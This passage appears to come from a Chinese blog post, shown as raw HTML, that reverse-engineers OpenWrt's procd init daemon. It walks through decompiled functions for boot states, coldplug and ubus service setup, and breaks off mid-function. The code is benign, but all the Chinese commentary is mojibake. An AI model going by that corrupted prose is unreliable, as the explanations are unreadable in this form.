class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_AC7C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;/sbin/ubusd&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( choi )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- early -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - early -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      v0 = <span class="built_in">sub_10C5C</span>(<span class="string">&quot;/etc/hotplug.json&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_FAF8</span>(v0);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">sub_AACC</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- ubus -\n&quot;</span>);</span><br><span class="line">      v1 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - ubus -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_BD60</span>(v1);</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init -\n&quot;</span>);</span><br><span class="line">      v2 = <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_D628</span>(v2);</span><br><span class="line">      <span class="built_in">sub_D4CC</span>(<span class="string">&quot;ubus&quot;</span>, v3);</span><br><span class="line">      <span class="built_in">sub_B458</span>();</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- init complete -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - init complete -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- shutdown -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - shutdown -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">sub_B3F4</span>(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">      <span class="built_in">sync</span>();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;- reboot -\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;procd: - reboot -\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">      <span class="built_in">reboot</span>(dword_1ACCC);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unhandled state %d\n&quot;</span>, choi);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>çŠ¶æ€å¤„ç†</strong></p><ol><li><strong><code>case 1</code> - Early</strong>ï¼š<ul><li>è®°å½•æ—¥å¿— â€œ- early -â€œ</li><li>è°ƒç”¨ <code>sub_AACC(0)</code> æ‰§è¡Œæ—©æœŸåˆå§‹åŒ–ã€‚</li><li>è°ƒç”¨ <code>sub_10C5C(&quot;/etc/hotplug.json&quot;)</code> å¤„ç†é…ç½®æ–‡ä»¶ã€‚</li><li>è°ƒç”¨ <code>sub_FAF8</code> å¯èƒ½ç”¨äºè¿›ä¸€æ­¥åˆå§‹åŒ–ã€‚</li></ul></li><li><strong><code>case 2</code> - Ubus Initialization</strong>ï¼š<ul><li>è°ƒç”¨ <code>sub_AACC(0)</code>ã€‚</li><li>è®°å½•æ—¥å¿— â€œ- ubus -â€œ</li><li>è°ƒç”¨ <code>sub_BD60</code> è¿›è¡Œ Ubus åˆå§‹åŒ–ã€‚</li><li>è®°å½•æ—¥å¿— â€œ- init -â€œ</li><li>è°ƒç”¨ <code>sub_D628</code> è¿›è¡Œè¿›ä¸€æ­¥åˆå§‹åŒ–ã€‚</li><li>è°ƒç”¨ <code>sub_D4CC(&quot;ubus&quot;, v3)</code> å¯åŠ¨ <code>/sbin/ubusd</code>ã€‚</li><li>è°ƒç”¨ <code>sub_B458()</code> æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ­¥éª¤ã€‚</li><li>è°ƒç”¨ <code>sub_B3F4</code> å¤„ç†ä¸€ç³»åˆ—çŠ¶æ€ï¼ˆâ€respawnâ€, â€œaskconsoleâ€, â€œaskfirstâ€, â€œsysinitâ€ï¼‰ã€‚</li></ul></li><li><strong><code>case 3</code> - Init Complete</strong>ï¼š<ul><li>è®°å½•æ—¥å¿— â€œ- init complete -â€œ</li></ul></li><li><strong><code>case 4</code> - Shutdown</strong>ï¼š<ul><li>è®°å½•æ—¥å¿— â€œ- shutdown -â€œ</li><li>è°ƒç”¨ <code>sub_B3F4(&quot;shutdown&quot;)</code> å¤„ç†å…³é—­æ“ä½œã€‚</li><li>è°ƒç”¨ <code>sync()</code> ç¡®ä¿æ•°æ®å®Œæ•´æ€§ã€‚</li></ul></li><li><strong><code>case 5</code> - Reboot</strong>ï¼š<ul><li>è®°å½•æ—¥å¿— â€œ- reboot -â€œ</li><li>è°ƒç”¨ <code>reboot(dword_1ACCC)</code> æ‰§è¡Œé‡å¯ã€‚</li></ul></li><li><strong><code>default</code> - Unhandled State</strong>ï¼š<ul><li>è®°å½•æœªå¤„ç†çŠ¶æ€çš„æ—¥å¿—ã€‚</li></ul></li></ol><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>sub_AACCå‡½æ•°ç¡®ä¿åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ­£ç¡®åˆå§‹åŒ–çœ‹é—¨ç‹—ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿæ— å“åº”æ—¶é‡‡å–é€‚å½“æªæ–½ã€‚</p><p>sub_10C5Cå‡½æ•°ç”¨äºè®¾ç½®å’Œé…ç½®ä¸€ä¸ªå¤„ç†çƒ­æ’æ‹”äº‹ä»¶çš„å¥—æ¥å­—ï¼Œå¹¶å°†å…¶é›†æˆåˆ°äº‹ä»¶å¾ªç¯ä¸­ï¼ˆæˆ–è®¸ç¬¬ä¸€æ¬¡æ˜¯åˆå§‹åŒ–ï¼Œè¿™æ¬¡æ‰æ˜¯é…ç½®ï¼Ÿï¼‰</p><h4 id="sub-FAF8"><a href="#sub-FAF8" class="headerlink" title="sub_FAF8"></a>sub_FAF8</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sub_FAF8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *data; <span class="comment">// [sp+0h] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *file[<span class="number">6</span>]; <span class="comment">// [sp+8h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  file[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  file[<span class="number">0</span>] = <span class="string">&quot;udevtrigger&quot;</span>;</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">umount2</span>(<span class="string">&quot;/dev/&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;/dev&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="string">&quot;mode=0755,size=512K&quot;</span>);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/shm&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mkdir</span>(<span class="string">&quot;/dev/pts&quot;</span>, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="built_in">mount</span>(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  dword_1AE8C = (<span class="type">int</span>)sub_FA40;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_1AE90 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start coldplug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start coldplug\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new coldplug instance\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;procd: Failed to start new coldplug instance\n&quot;</span>, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">uloop_process_add</span>(&amp;unk_1AE80);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched coldplug instance, pid=%d\n&quot;</span>, dword_1AE90);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched coldplug instance, pid=%d\n&quot;</span>, <span class="string">&quot;procd_coldplug&quot;</span>, <span class="number">65</span>, dword_1AE90);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªå‡½æ•°çš„ä¸»è¦ä½œç”¨ä¾¿æ˜¯åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ£€æµ‹å’Œåˆå§‹åŒ–æ‰€æœ‰å·²è¿æ¥çš„ç¡¬ä»¶è®¾å¤‡ï¼Œå¹¶addä¸€ä¸ªprocess sub_FA40</p><h3 id="sub-FA40"><a href="#sub-FA40" class="headerlink" title="sub_FA40"></a>sub_FA40</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA40</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Finished udevtrigger\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Finished udevtrigger\n&quot;</span>, <span class="string">&quot;udevtrigger_complete&quot;</span>, <span class="number">36</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_10C38</span>(sub_FA9C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„è¿˜æ˜¯ä¸€ä¸ªlogçš„è®°å½•ï¼Œä¸»è¦è¿˜æ˜¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA9C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Coldplug complete\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Coldplug complete\n&quot;</span>, <span class="string">&quot;coldplug_complete&quot;</span>, <span class="number">29</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = <span class="built_in">sub_10C38</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AE4C</span>(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆè¿è¡Œä¸€æ¬¡sub_AE4Cå‡½æ•°</p><p>æ­¤æ—¶å°±æ˜¯case2äº†</p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><h4 id="sub-8D60"><a href="#sub-8D60" class="headerlink" title="sub_8D60"></a>sub_8D60</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BD60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_1AD5C = (<span class="type">int</span>)sub_BC18;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BC18</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">ubus_connect</span>(dword_1AD68);</span><br><span class="line">  dword_1AD6C = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v0 + <span class="number">92</span>) = sub_BBFC;</span><br><span class="line">    <span class="built_in">sub_D610</span>();</span><br><span class="line">    <span class="built_in">sub_C79C</span>(dword_1AD6C);</span><br><span class="line">    <span class="built_in">sub_F99C</span>(dword_1AD6C);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connected to ubus, id=%08x\n&quot;</span>, *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(</span><br><span class="line">        (FILE *)stderr,</span><br><span class="line">        <span class="string">&quot;procd: %s(%d): Connected to ubus, id=%08x\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ubus_connect_cb&quot;</span>,</span><br><span class="line">        <span class="number">58</span>,</span><br><span class="line">        *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_fd_add</span>(dword_1AD6C + <span class="number">44</span>, <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connection to ubus failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Connection to ubus failed\n&quot;</span>, <span class="string">&quot;ubus_connect_cb&quot;</span>, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•è¿æ¥åˆ° <code>ubus</code>ï¼Œå¹¶æ ¹æ®è¿æ¥ç»“æœæ‰§è¡Œç›¸åº”çš„åˆå§‹åŒ–å’Œäº‹ä»¶å¤„ç†è®¾ç½®ã€‚æˆåŠŸæ—¶ï¼Œé…ç½®å›è°ƒå¹¶å°†è¿æ¥æ·»åŠ åˆ°äº‹ä»¶å¾ªç¯ï¼›å¤±è´¥æ—¶ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨ä»¥ä¾¿ç¨åé‡è¯•ã€‚</p><h4 id="sub-D4CC"><a href="#sub-D4CC" class="headerlink" title="sub_D4CC"></a>sub_D4CC</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_D4CC</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">blob_buf_init</span>(&amp;dword_1AD8C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>((<span class="type">int</span>)<span class="string">&quot;name&quot;</span>, a1);</span><br><span class="line">  v4 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instances&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instance1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v6 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;command&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; ; i = <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">strtok</span>(i, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_CE04</span>(<span class="number">0</span>, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v6);</span><br><span class="line">  v9 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;respawn&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;3600&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v9);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v5);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_D304</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;add&quot;</span>, dword_1AD8C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ„å»º <code>blobmsg</code> æ¶ˆæ¯æ¥ç»„ç»‡å’Œä¼ é€’æ•°æ®ã€‚å®ƒ<strong>åˆ›å»ºä¸€ä¸ªåŒ…å«å®ä¾‹å’Œå‘½ä»¤çš„ç»“æ„</strong>ï¼Œé€‚ç”¨äºéœ€è¦å¤æ‚æ•°æ®ä¼ é€’çš„åœºæ™¯ã€‚æœ€ç»ˆè°ƒç”¨ <code>sub_D304</code> å¤„ç†è¯¥æ¶ˆæ¯ã€‚</p><p>å‡½æ•° <code>sub_D304</code> å¤„ç†æœåŠ¡è¯·æ±‚ï¼Œæ ¹æ®è¾“å…¥å‚æ•°æ›´æ–°ç°æœ‰æœåŠ¡æˆ–åˆ›å»ºæ–°æœåŠ¡ã€‚</p><h4 id="sub-B458å‡½æ•°"><a href="#sub-B458å‡½æ•°" class="headerlink" title="sub_B458å‡½æ•°"></a>sub_B458å‡½æ•°</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_B458</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">regoff_t</span> *p_rm_eo; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">regoff_t</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">regoff_t</span> v8; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// 